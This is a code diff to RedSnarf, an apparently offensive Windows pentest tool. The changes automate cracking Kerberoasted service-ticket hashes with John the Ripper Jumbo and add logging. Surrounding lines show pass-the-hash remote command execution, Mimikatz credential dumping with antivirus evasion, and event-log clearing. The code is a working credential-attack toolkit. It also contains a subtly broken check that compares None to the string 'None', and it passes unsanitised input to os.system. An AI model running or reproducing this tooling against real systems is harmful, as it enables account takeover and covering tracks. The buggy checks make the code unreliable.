@@ -9,7 +9,7 @@ import socket, fcntl, struct, time, base64, logging
 from random import shuffle
 
 # Logging definitions 
-logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s %(message)s', filename='redsnarf.log', filemode='w')
+logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s %(message)s', filename='redsnarf.log', filemode='a')
 logging.debug("Command parameters run: %s", sys.argv[1:])
 
 try:
@@ -79,6 +79,18 @@ def banner():
 #WinSCP Decryption Routines 
 #Source: https://www.jonaslieb.com/blog/2015/02/20/winscp-session-password-decryption-part-2/
 
+#Finds if JTR Jumbo is installed and returns path
+def jtr_jumbo_installed():
+	#Use README-jumbo as an indicator that Jtr Jumbo is installed
+	proc = subprocess.Popen("locate *README-jumbo", stdout=subprocess.PIPE,shell=True)
+	stdout_value = proc.communicate()[0]
+	
+	if len(stdout_value)!=0:
+		jumbojohnpath=stdout_value[:-13]+"run/john"
+		if os.path.isfile(jumbojohnpath):
+			return jumbojohnpath
+
+
 class Decrypter:
 	SIMPLE_STRING = "0123456789ABCDEF"
 	SIMPLE_MAGIC = 0xA3
@@ -118,7 +130,6 @@ def decrypt(hostname, username, password):
 		return result[len(key):]
 
 	return result
-
 
 #Code for Password Policy Retrievel
 #source: https://github.com/Wh1t3Fox/polenum
@@ -317,6 +328,93 @@ def gppdecrypt(cpassword_pass):
 	o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
 	print colored('Your cpassword is '+o[:-ord(o[-1])].decode('utf16'),'green')
 
+#Routine helps start John the Ripper Jumbo
+def quickjtrjumbo(filename, jtrjumbopath):
+	#Set our variables/etc up
+	LogicRule = []
+	LogicRule.append("AppendNumbers_and_Specials_Simple")
+	LogicRule.append("L33t")
+	LogicRule.append("AppendYears")
+	LogicRule.append("AppendSeason")
+	LogicRule.append("PrependAppend1-4")
+	LogicRule.append("ReplaceNumbers")
+	LogicRule.append("AddJustNumbersLimit8")
+	LogicRule.append("ReplaceLetters")
+	LogicRule.append("ReplaceLettersCaps")
+
+	WordList=""
+	KoreRuleToUse=""
+
+	#Setup if we're going to use a wordlist or not
+	if os.path.isfile("/usr/share/wordlists/rockyou.txt"):		
+		print colored("[+]Detected /usr/share/wordlists/rockyou.txt",'green')
+		UseRockYou = raw_input("Would you like to use rockyou.txt as your wordlist?: Y/(N) ")
+		if UseRockYou in yesanswers:	
+			print colored("[+]Selected as wordlist - /usr/share/wordlists/rockyou.txt",'green')
+			WordList = "/usr/share/wordlists/rockyou.txt"
+		elif UseRockYou in noanswers:
+			Alternative = raw_input("Would you like to use an alternative wordlist?: Y/(N) ")
+			if Alternative in yesanswers:	
+				WordList = raw_input("Enter path to wordlist: ")
+				if os.path.isfile(WordList):	
+					print colored("[+]Selected as wordlist - "+WordList,'green')
+				else:
+					print colored("[-]Selected wordlist - "+WordList+" doesn't exist...",'red')
+					sys.exit()
+			else:	
+				WordList = ""
+		else:
+			WordList=""
+
+	#If we're using a wordlist check to see if KoreLogicRules are installed and
+	#see if we want to use them
+	if WordList!="":
+		print colored("[+]KoreLogic Rules are installed",'green')	
+		UseKoreLogic = raw_input("Would you like to use KoreLogicRules?: Y/(N) ")
+		
+		#If KoreLogic is installed and we want to use it
+		if UseKoreLogic in yesanswers:	
+			print colored("[+]Some common rules are:",'green')
+			print colored("[0]AppendNumbers_and_Specials_Simple",'blue')
+			print colored("[1]L33t",'blue')
+			print colored("[2]AppendYears",'blue')
+			print colored("[3]AppendSeason",'blue')
+			print colored("[4]PrependAppend1-4",'blue')
+			print colored("[5]ReplaceNumbers",'blue')
+			print colored("[6]AddJustNumbersLimit8",'blue')
+			print colored("[7]ReplaceLetters",'blue')
+			print colored("[8]ReplaceLettersCaps",'blue')
+			print colored("[9]Other",'blue')
+			
+			KoreLogicRule = raw_input("Please enter the number of the rule you wish to use: ")	
+			
+			if KoreLogicRule=="9":
+				KoreRuleToUse=raw_input("Please enter the rule you wish to use: ")
+				if KoreRuleToUse=="":
+					print colored("[-]No rule entered...",'red')
+					#exit(1)
+				else:
+					print colored("[+]Selected KoreLogicRule - "+ KoreRuleToUse,'green')
+			else:
+				print colored("[+]Selected KoreLogicRule - "+ str(LogicRule[int(KoreLogicRule)]),'green')
+				KoreRuleToUse = str(LogicRule[int(KoreLogicRule)])
+
+	#If no wordlist and no korelogic is selected
+	if WordList=="" and KoreRuleToUse=="":
+		print colored("[+]Starting John The Ripper with No Wordlist or KoreLogicRules",'yellow')
+		print colored("[+]"+jtrjumbopath+" --format=krb5tgs "+str(filename),'yellow')
+		os.system(jtrjumbopath+" --format=krb5tgs "+str(filename))
+	#If a wordlist is selected and we're not using korelogic
+	elif WordList!="" and KoreRuleToUse=="":
+		print colored("[+]Starting John The Ripper with Wordlist and No KoreLogicRules",'yellow')
+		print colored("[+]"+jtrjumbopath+" --format=krb5tgs "+str(filename)+ " --wordlist="+WordList+" --rules",'yellow')
+		os.system(jtrjumbopath+" --format=krb5tgs "+str(filename)+ " --wordlist=" +WordList+" --rules")
+	#If we're using a wordlist and we're using korelogic
+	elif WordList!="" and KoreRuleToUse!="":
+		print colored("[+]Starting John The Ripper with Wordlist and KoreLogicRules",'yellow')
+		print colored("[+]"+jtrjumbopath+" --format=krb5tgs "+str(filename)+ " --wordlist="+WordList+" --rules:"+KoreRuleToUse,'yellow')
+		os.system(jtrjumbopath+" --format=krb5tgs "+str(filename)+ " --wordlist=" +WordList+" --rules:"+KoreRuleToUse)
+
 #Routine helps start John the Ripper
 def quickjtr(filename):
 	#Set our variables/etc up
@@ -444,8 +542,10 @@ def WriteLAT():
 		fout.write(':end\n')
 		fout.close() 
 		print colored("[+]Written to /tmp/lat.bat ",'yellow')
+		logging.info("[+]Written to /tmp/lat.bat ")
 	except:
 		print colored("[-]Something went wrong...",'red')
+		logging.error("[-]Something went wrong writing LAT file")
 
 #Routine Write out a batch file which can be used to turn on/off LocalAccountTokenFilterPolicy
 def WriteFAT():
@@ -486,8 +586,10 @@ def WriteFAT():
 		fout.write(':end\n')
 		fout.close() 
 		print colored("[+]Written to /tmp/fat.bat ",'yellow')
+		logging.info("[+]Written to /tmp/fat.bat ")
 	except:
 		print colored("[-]Something went wrong...",'red')
+		logging.error("[-]Something went wrong writing FAT file")
 
 #Routine gets current ip address
 def get_ip_address(ifname):
@@ -625,6 +727,7 @@ def getdescfield(ip,username,password,path):
 		
 	else:
 		print colored('[-]Unable to find username file...','red')
+		logging.error('[-]Unable to find username file...')
 
 #Main routine for dumping from a remote machine
 def datadump(user, passw, host, path, os_version):
@@ -806,6 +909,7 @@ def datadump(user, passw, host, path, os_version):
 						print colored("[-]mimi_creddump1.txt file not found",'red')       
 				except OSError:
 					print colored("[-]Something went wrong running Mimikatz...",'red')
+					logging.error("[-]Something went wrong running Mimikatz...")
 
 			#Routine clears event logs
 			if clear_event in events_logs:
@@ -825,6 +929,7 @@ def datadump(user, passw, host, path, os_version):
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c "+xcommand+"\" 2>/dev/null")
 				except:
 					print colored("[-]Something went wrong ...",'red')
+					logging.error("[-]Something went wrong running custom command")
 
 			#Routine runs a stealth mimikatz
 			if stealth_mimi in yesanswers or stealth_mimi=="AV":
@@ -1730,7 +1835,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4g", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4h", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1753,6 +1858,7 @@ ugroup.add_argument("-uE", "--empire_launcher", dest="empire_launcher", default=
 ugroup.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
 ugroup.add_argument("-uJ", "--john_to_pipal", dest="john_to_pipal", default="", help="<Optional> Send passwords cracked with JtR to Pipal for Auditing")
 ugroup.add_argument("-uJW", "--sendtojohn", dest="sendtojohn", default="", help="<Optional> Enter path to NT Hash file to send to JtR")
+ugroup.add_argument("-uJS", "--sendspntojohn", dest="sendspntojohn", default="", help="<Optional> Enter path of SPN Hash file to send to JtR Jumbo")
 ugroup.add_argument("-uL", "--lockdesktop", dest="lockdesktop", default="", help="<Optional> Lock remote users Desktop")
 ugroup.add_argument("-uLP", "--liveips", dest="liveips", default="", help="<Optional> Ping scan to generate a list of live IP's")
 ugroup.add_argument("-uM", "--mssqlshell", dest="mssqlshell", default="", help="<Optional> Start MSSQL Shell use WIN for Windows Auth, DB for MSSQL Auth")
@@ -1866,6 +1972,7 @@ rdp_connect=args.rdp_connect
 cidr=args.cidr
 liveips=args.liveips
 split_spn=args.split_spn
+sendspntojohn=args.sendspntojohn
 
 #Work around for if a password has !! as the command line will bork
 if args.password=='epass':
@@ -1884,6 +1991,7 @@ if split_spn!='n':
 		#Check file exists and exit if not found
 		if not os.path.isfile(usr_response):
 			print colored("\n[+]WARNING - File doesn't exist",'red')
+			logging.error("[+]WARNING - File doesn't exist")
 			sys.exit()
 
 		#Read in hashes 
@@ -1891,6 +1999,7 @@ if split_spn!='n':
 
 		#Detect : in hashes, if it is found those hashes won't be detected properly
 		if ":" in fo:
+			logging.error("[-]We've got some corrupted hashes, replacing : for . which should fix them")
 			print colored("[-]We've got some corrupted hashes, replacing : for . which should fix them",'red')
 			#Replace all occurances of : with .
 			fo=fo.replace(":",".")
@@ -1901,7 +2010,7 @@ if split_spn!='n':
 
 			#Print status message
 			print colored("[+]Fixed hashes and written them to "+usr_response+".fix, try again using this file",'yellow')
-
+			logging.info("[+]Fixed hashes and written them to "+usr_response+".fix, try again using this file")
 			#Exit, so function can be run again
 			sys.exit()
 
@@ -1942,10 +2051,10 @@ if split_spn!='n':
 
 				#Print status that hash has been written to file and path
 				print colored("[+]Written hash for "+username+" to "+outputpath+username+".txt",'yellow')
-
+				logging.info("[+]Written hash for "+username+" to "+outputpath+username+".txt")
 			#Print status that usernames have been written to file and path
 			print colored("[+]Written usernames to "+outputpath+"usernames.txt",'yellow')
-		
+			logging.info("[+]Written usernames to "+outputpath+"usernames.txt")
 	sys.exit()
 
 #Wrap and cut an nmap scan to get output of just live ip's in a subnet
@@ -2052,6 +2161,23 @@ if cidr!='':
 if sendtojohn!='':
 	print colored("[+]Sending Hashes from "+sendtojohn+" to JtR:",'yellow')
 	quickjtr(sendtojohn)
+	sys.exit()
+
+#Function sends SPN file to Jtr Jumbo
+if sendspntojohn!='':
+	#Check to see if Jtr Jumbo is installed
+	if jtr_jumbo_installed()!="None":
+		if os.path.isfile(sendspntojohn):
+			print colored("[+]SPN's to Jtr Jumbo",'green')
+			print colored("[+]Sending SPN(s) in "+sendspntojohn+" to Jtr Jumbo",'yellow')
+			quickjtrjumbo(sendspntojohn,jtr_jumbo_installed())
+		else:
+			print colored("[+]SPN's to Jtr Jumbo",'green')
+			print colored("[-] "+sendspntojohn +" not found",'red')
+	else:
+		print colored("[+]Jtr Jumbo not found..",'red')
+		sys.exit()
+	
 	sys.exit()
 
 #Code takes a hash file which has previously been seen by Jtr, cuts out the cracked passwords, gets rid of any blank lines, gets rid of the last line, outputs to a tmp file
@@ -2412,7 +2538,7 @@ if get_spn in yesanswers or get_spn=="l":
 		try:
 			#Get SPN's from DC
 			print colored("[+]Trying to get SPN's from DC",'yellow')
-			
+			logging.info("[+]Trying to get SPN's from DC")
 			#Confirm that remote IP is a DC (Check port 88 Kerberos is Open)
 			checkport()
 
@@ -2438,13 +2564,22 @@ if get_spn in yesanswers or get_spn=="l":
 
 			print colored("[+]Configuration OK...",'yellow')
 
-			print colored("\n[+]To crack the extracted hashes with JtR,",'blue')
-			print colored("[+]JtR Jumbo Patch is needed which can be cloned from ",'blue')
-			print colored("[+]https://github.com/magnumripper/JohnTheRipper.git",'yellow')
-			print colored("\n[+]If building in VMWare the following will probably be needed",'blue')
-			print colored("[+]./configure CFLAGS=\"-g -O2 -mno-avx2",'yellow')
-			print colored("[+]make\n",'yellow')
-
+			#Use README-jumbo as an indicator that Jtr Jumbo is installed
+			proc = subprocess.Popen("locate *README-jumbo", stdout=subprocess.PIPE,shell=True)
+			stdout_value = proc.communicate()[0]
+		
+			#Check to see if Jtr Jumbo is installed
+			if jtr_jumbo_installed()!="None":
+				print colored("\n[+]JrR Jumbo Patch must be used to crack SPNS's",'yellow')
+				print colored("[+]JrR Jumbo Patch installed "+jtr_jumbo_installed()+"\n",'green')
+			else:		
+				print colored("\n[+]To crack the extracted hashes with JtR,",'blue')
+				print colored("[+]JtR Jumbo Patch is needed which can be cloned from ",'blue')
+				print colored("[+]https://github.com/magnumripper/JohnTheRipper.git",'yellow')
+				print colored("\n[+]If building in VMWare the following will probably be needed",'blue')
+				print colored("[+]./configure CFLAGS=\"-g -O2 -mno-avx2",'yellow')
+				print colored("[+]make\n",'yellow')
+		
 			#Check that a domain name has been entered
 			if domain_name==".":
 				print colored("[-]You must enter a domain - e.g. ecorp.local",'red')
@@ -2473,6 +2608,7 @@ if get_spn in yesanswers or get_spn=="l":
 			if "Type position out of range" in stdout_value:
 				print colored("[-]Type position out of range, something has gone wrong with pyasn1...",'red')
 				print colored("[-]to fix remove pyasn1 folder from /usr/local/lib/python2.7/dist-packages/ and reinstall",'red')
+				logging.debug(stdout_value)
 				sys.exit()
 
 			#Check output to see whether SPN entries were found
@@ -2482,17 +2618,18 @@ if get_spn in yesanswers or get_spn=="l":
 
 			#Confirm that SPN's have been saved properly
 			if not os.path.isfile(outputpath+targets[0]+"/spns.txt"):
-				print colored("[-]No SPNS's were output",'red')
+				logging.info(stdout_value)
+				print colored("[-]No SPNS's were output to file, check error logs",'red')
 			else:
-				print colored("[+]To parse an SPN hash file use",'blue')
+				print colored("[+]To parse a SPN hash file which contains multiple entries use",'blue')
 				print colored("[+]./redsnarf.py -uSS y",'yellow')
 
+				logging.info("[+]SPN's output to "+outputpath+targets[0]+"/spns.txt")
 				print colored("\n[+]SPN's output to "+outputpath+targets[0]+"/spns.txt",'green')
-				
+
 				#Check for any broken hashes, if a : is found Jtr will bork changing it for . solves the issue.
 				#Read in hashes 
 				fo=open(outputpath+targets[0]+"/spns.txt","r").read()
-
 				#Detect : in hashes, if it is found those hashes won't be detected properly
 				if ":" in fo:
 					print colored("[-]We've got some corrupted hashes, replacing : for . which should fix them",'red')
@@ -2505,7 +2642,27 @@ if get_spn in yesanswers or get_spn=="l":
 
 					#Print status message
 					print colored("[+]Fixed hashe(s) and written them to "+outputpath+targets[0]+"/spns.txt"+".fix",'green')
-
+					logging.info("[+]Fixed hashe(s) and written them to "+outputpath+targets[0]+"/spns.txt"+".fix")
+			
+				#Check to see if Jtr Jumbo is installed
+				if jtr_jumbo_installed()!="None":
+					usr_response = raw_input("\nDo you want to start cracking with Jtr Jumbo? (y/n) : ")
+					if usr_response in noanswers:
+						exit(1)
+					else:
+						print colored("[+]Sending SPN's to Jtr Jumbo",'green')
+						if os.path.isfile(outputpath+targets[0]+"/spns.txt"+".fix"):
+							print colored("[1]Detected "+outputpath+targets[0]+"/spns.txt",'yellow')
+							print colored("[2]Detected "+outputpath+targets[0]+"/spns.txt"+".fix",'yellow')
+							usr_response = raw_input("\nPlease select which file to send to John? (1/2) : ")
+							if usr_response == "1":
+								quickjtrjumbo(outputpath+targets[0]+"/spns.txt",jtr_jumbo_installed())
+							elif usr_response == "2":
+								quickjtrjumbo(outputpath+targets[0]+"/spns.txt"+".fix",jtr_jumbo_installed())
+						
+						else:
+							print colored("[+]Detected "+outputpath+targets[0]+"/spns.txt",'yellow')
+							quickjtrjumbo(outputpath+targets[0]+"/spns.txt",jtr_jumbo_installed())
 			sys.exit()
 			
 		except OSError:
